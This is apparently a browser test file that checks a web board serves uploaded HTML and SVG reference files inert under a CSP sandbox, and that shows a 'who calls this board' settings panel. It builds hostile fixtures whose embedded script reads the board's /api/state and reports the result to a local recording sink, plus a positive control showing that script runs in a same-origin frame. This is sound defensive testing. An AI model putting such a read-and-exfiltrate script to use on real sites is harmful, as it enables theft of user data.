"""Reference files render inert; who calls the board is shown (task 113, WP05).

`/files/reference/…` serves what people and agents wrote. An `.html` or
`.svg` there used to run its scripts as this board's origin. Now both are
sent with `Content-Security-Policy: sandbox` and `nosniff`. This case
drives the real browser against a second disposable backend made here:

- **a positive control first**: the same script, put in a same-origin
  frame of the board's own page, runs, reads `/api/state` and reports to
  a recording sink on another loopback port — so the fixture's script
  and the sink both demonstrably work;
- **the HTML file** and **the SVG file**, opened at their `/files/` URLs
  the way the page's own link opens them: each still renders (a
  screenshot of each), and the sink hears nothing from either — no
  script ran, so nothing called this board's API;
- **Settings → Installation**: the "Who calls this board" panel, in
  report mode, drawing the Host values this very browser sent.

The backend, the sink and their ports are made for this case and taken
down with it; the shared backend the other cases read is not touched.
"""

import json
import shutil
import threading
import time
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import benchverify as bv

S = bv.SESSION


def setUpModule():
    if not S.get("browser"):
        raise bv.SetupError("run these through verify/browser, which provides the "
                            "browser and the disposable backend")


def shot(name: str):
    path = S["shots"] / f"{name}.png"
    S["browser"].screenshot(path)
    S["required"].append(path)
    return path


def sink(hits: list) -> ThreadingHTTPServer:
    """Records every request's path; answers 204 with CORS open, so a
    script that ran anywhere can report to it."""

    class Record(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            hits.append(self.path)
            self.send_response(204)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    server = ThreadingHTTPServer(("127.0.0.1", 0), Record)
    server.daemon_threads = True
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


def script(sink_url: str, name: str) -> str:
    """What a hostile reference file would do: mark itself, read this
    board's API as its origin, and report what it read."""
    return (
        f"document.title = 'SCRIPT RAN {name}';"
        f"fetch({sink_url!r} + '/ran?f={name}', {{mode: 'no-cors'}});"
        "fetch('/api/state').then(r => r.text()).then(t =>"
        f" fetch({sink_url!r} + '/api?f={name}&n=' + t.length, {{mode: 'no-cors'}}))"
        f".catch(() => fetch({sink_url!r} + '/apierr?f={name}', {{mode: 'no-cors'}}));")


class ReferenceFilesRenderInert(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        shared = S["backend"]
        cls.hits = []
        cls.sink = sink(cls.hits)
        cls.sink_url = f"http://127.0.0.1:{cls.sink.server_address[1]}"
        base = shared.base.parent / "reference-files-fixture"
        shutil.rmtree(base, ignore_errors=True)
        cls.backend = bv.Backend(shared.tool, base, dict(shared.env), shared.python)
        ref = cls.backend.work / "reference"
        ref.mkdir(parents=True, exist_ok=True)
        cls.html = (
            "<!doctype html><html><head><title>Reference document</title>"
            "<style>body{font:18px/1.5 serif;margin:40px} h1{color:#246}</style>"
            "</head><body><h1 id='doc'>A reference document</h1>"
            "<p>Ordinary prose, a <b>bold</b> word and a list:</p>"
            "<ul><li>one</li><li>two</li></ul>"
            f"<script>{script(cls.sink_url, 'html')}</script></body></html>")
        (ref / "hostile.html").write_text(cls.html, encoding="utf-8")
        (ref / "hostile.svg").write_text(
            '<svg xmlns="http://www.w3.org/2000/svg" width="420" height="140">'
            '<rect width="420" height="140" fill="#e8f0f4"/>'
            '<text x="20" y="80" font-size="28" fill="#246">An SVG diagram</text>'
            f'<script><![CDATA[{script(cls.sink_url, "svg")}]]></script></svg>',
            encoding="utf-8")
        cls.backend.start()
        cls.origin = S["browser"].origin

    @classmethod
    def tearDownClass(cls):
        S["browser"].origin = cls.origin
        cls.sink.shutdown()
        cls.sink.server_close()
        cls.backend.stop()
        shutil.rmtree(cls.backend.base, ignore_errors=True)

    def heard(self, name: str, wait: float = 3.0) -> list:
        deadline = time.time() + wait
        while time.time() < deadline:
            got = [h for h in self.hits if f"f={name}" in h]
            if got:
                return got
            time.sleep(0.2)
        return [h for h in self.hits if f"f={name}" in h]

    def board(self):
        b = S["browser"]
        b.origin = self.backend.url
        b.viewport(1280, 800)
        b.goto("/")
        if not b.wait("document.querySelectorAll('.drop[data-stage]').length >= 5", 15):
            raise bv.CheckFailed("the board never drew its stage columns")
        return b

    def test_1_the_same_script_runs_in_a_same_origin_frame(self):
        """The control: without the sandbox this fixture does call the API.

        Since task 124 the board's own page is sent with a script policy
        that refuses an inline script and any frame, so the control runs in
        a same-origin document that carries no policy — the JSON of
        /api/state — where a frame inherits this board's origin and
        nothing else."""
        b = self.board()
        b.goto("/api/state")
        b.eval("(() => { const f = document.createElement('iframe');"
               f" f.srcdoc = {json.dumps(self.html)}; f.id = 'wp05-control';"
               " document.body.appendChild(f); })()")
        deadline = time.time() + 10
        while time.time() < deadline and not any(
                h.startswith("/api?f=html") for h in self.hits):
            time.sleep(0.2)
        got = self.heard("html", 0.5)
        self.assertTrue(any(h.startswith("/ran?f=html") for h in got), self.hits)
        api = [h for h in got if h.startswith("/api?f=html")]
        self.assertTrue(api, f"the control never read /api/state: {self.hits}")
        self.assertGreater(int(api[0].rsplit("n=", 1)[1]), 100)
        S["metrics"]["referenceControl"] = got
        self.hits.clear()

    def open_file(self, name: str):
        b = S["browser"]
        b.origin = self.backend.url
        b.viewport(1280, 800)
        b.goto(f"/files/reference/{name}")
        return b

    def rendered(self, b) -> dict:
        """What the document shows, read by the automation (which is not
        page script) — or what could not be read, said as such."""
        try:
            return {"title": b.eval("document.title"),
                    "text": b.eval("document.documentElement.textContent")[:200]}
        except (bv.CheckFailed, bv.SetupError) as exc:
            return {"unreadable": str(exc)[:200]}

    def test_2_an_html_reference_renders_and_its_script_does_not_run(self):
        b = self.open_file("hostile.html")
        time.sleep(2.5)
        shot("reference-html-inert")
        seen = self.rendered(b)
        self.assertEqual([], self.heard("html", 1.0),
                         "a script in a served HTML reference ran")
        if "unreadable" not in seen:
            self.assertNotIn("SCRIPT RAN", seen["title"])
            self.assertIn("A reference document", seen["text"])
        S["metrics"]["referenceHtml"] = {"sinkHits": [], **seen}

    def test_3_an_svg_reference_renders_and_its_script_does_not_run(self):
        b = self.open_file("hostile.svg")
        time.sleep(2.5)
        shot("reference-svg-inert")
        seen = self.rendered(b)
        self.assertEqual([], self.heard("svg", 1.0),
                         "a script in a served SVG reference ran")
        if "unreadable" not in seen:
            self.assertNotIn("SCRIPT RAN", seen["title"])
            self.assertIn("An SVG diagram", seen["text"])
        S["metrics"]["referenceSvg"] = {"sinkHits": [], **seen}

    def test_4_settings_shows_who_calls_this_board(self):
        b = self.board()
        b.click('#views button[data-view="settings"]')
        if not b.wait("document.querySelectorAll('#snav [data-ssection]').length >= 5", 15):
            raise bv.CheckFailed("the settings sections never arrived")
        item = '#snav [data-ssection="installation"]'
        if b.eval(f"document.querySelector('{item}').offsetParent === null"):
            b.click('#snavtoggle')
        b.click(item)
        if not b.wait("!!document.querySelector('#s-callers')", 10):
            raise bv.CheckFailed("Settings → Installation drew no callers panel")
        b.eval("document.querySelector('#s-callers').scrollIntoView()")
        shot("settings-installation-callers")
        text = b.eval("document.querySelector('#s-callers').innerText")
        self.assertIn("Who calls this board", text)
        self.assertIn("report only — not a security pass", text)
        self.assertIn("Hosts seen", text)
        port = self.backend.url.rsplit(":", 1)[1]
        # what this very browser sent, as the backend received it
        self.assertIn(f":{port}", text)
        S["metrics"]["callersPanel"] = text[:1200]
